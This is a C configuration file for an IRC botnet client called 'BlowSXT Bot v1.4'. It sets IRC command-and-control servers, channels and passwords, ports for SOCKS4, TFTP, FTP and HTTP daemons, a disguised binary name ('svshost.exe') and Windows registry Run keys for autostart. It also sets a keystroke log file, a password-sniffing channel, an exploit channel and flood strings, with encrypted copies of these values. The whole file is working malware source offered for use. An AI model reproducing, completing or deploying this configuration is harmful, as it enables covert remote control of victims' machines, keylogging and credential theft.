// bot configuration (generic) - doesn't need to be encrypted
int port = 44444;				// server port
int port2 = 44444;				// backup server port

char botid[] = "security1";		// bot id && blowfish pass

int sock4port = 12921;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int ftpport = 15262;           	// Port # for ftpd daemon to run on
int httpport = 88;				// Port # for http daemon to run on

BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
BOOL CryptOutput = TRUE;		// enable crypted output

char prefix = ' ';				// command prefix (one character max.)
int maxrand = 30;				// how many random numbers in the nick

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!
// (copypaste start)
char version[]="pQm8R1nvPim.wJtIg1oxctW0"; //BlowSXT Bot v1.4
char password[]="Knew91n3L7t.duLTR/k5bil."; //0xp4r4d153
char modeonconn[]="K3W.v/NRDBz0"; //+iB
char server2[]="7j0YC0Vaufl0qad7h0cBMHf."; //z00m.lassis.org
char server[]="YvmDG0OX8DW/As3jP/9v1S1."; //irc.x86.cl
char serverpass[] = "";						// server password
char nickconst[] = "";						// first part to the bot's nick
char channel[]="sfSxL10mZSO0"; //#blowsxt
char chanpass[]="7JkvI1DK2x5.nQOKN0tsvN1/"; //bl0wsxtr0x
char channel2[]="sfSxL10mZSO0"; //#blowsxt
char chanpass2[]="7JkvI1DK2x5.nQOKN0tsvN1/"; //bl0wsxtr0x
char filename[]="RLBNd.DlRlf/1vkPx/4WCZM1"; //svshost.exe
char valuename[]="E4Rz00EvcVQ.yBv8j0QezaU."; //Microsoft Office
char szLocalPayloadFile[]="kggtF/d/STC0nwfmH.cSFks1"; //mserv.dat
char keylogfile[]="PaAWA1rMfiu0"; //keys.txt
char exploitchan[]="wG3gA0xt98E1"; //#sxt
char psniffchan[]="sfSxL10mZSO0dwPKK1Ymp9W/"; //#blowsxt-sniff
char regkey1[]="m2p/6.gIdWZ1RLBU6/Z4HgA1dS7Kh/JT0qw0rCEcm/m.Lkl0fAEen/29ozZ0uTq/g/dQe7U/"; //Software\Microsoft\Windows\CurrentVersion\Run
char regkey2[]="m2p/6.gIdWZ1RLBU6/Z4HgA1dS7Kh/JT0qw0rCEcm/m.Lkl0fAEen/29ozZ0J2yo.1R4uqM.N50bl.A6wgS."; //Software\Microsoft\Windows\CurrentVersion\RunServices
char regkey3[]="m2p/6.gIdWZ1RLBU6/Z4HgA17J5m51NP2cE0"; //Software\Microsoft\OLE
char regkey4[]="Ecmyz0oHymB0ujWxo1/sGoP/qwwzy.jkK9g.A0HCR/dPtLv1Txls2/7X/2L1"; //SYSTEM\CurrentControlSet\Control\Lsa
char *authost[] = {
	"*@$$$.fbi.gov"
	//"*@server.crazy-server0.com"	
	//"Qya6T.JUWqa19SqF50HK6m21"				//"*@$$$.fbi.gov"
};

// (copypaster end)
#else										// Recommended to use this only for Crypt() setup, this is unsecure.
char version[] = "BlowSXT Bot v1.4";			// Bots !version reply
char password[] = "0xp4r4d153";				// bot password
char modeonconn[] = "+iB";					// Can be more than one mode and contain both + and -
char nickconst[] = "";						// first part to the bot's nick

char server[] = "z00m.lassis.org";				// server
char server2[] = "irc.x86.cl";			// backup server (optional)
char serverpass[] = "";						// server password

char channel[] = "#blowsxt";				// channel that the bot should join
char chanpass[] = "bl0wsxtr0x";					// channel password

char channel2[] = "#blowsxt";				// backup channel (optional)
char chanpass2[] = "bl0wsxtr0x";					// backup channel password (optional)

char psniffchan[] = "#blowsxt-sniff";				// sniffing channel
char exploitchan[] = "#sxt";   // Channel where exploit messages get redirected

char filename[] = "svshost.exe";			// destination file name
char valuename[] = "Microsoft Office";	// value name for autostart
char szLocalPayloadFile[]="mserv.dat";		// Payload filename
char keylogfile[] = "keys.txt";	// keylog filename

char *authost[]={
	"*@$$$.fbi.gov"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
#endif

char *versionlist[] = {
	"0x1d0fb$0x34f8d$0x1d0fb$0x14e5a",
};

const char partline[] = "PaWaaPaWaaPaWaaPaWaaPaWaa"; //part floodline
const char floodline[] = "PaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaaPaWaa"; // Flood line
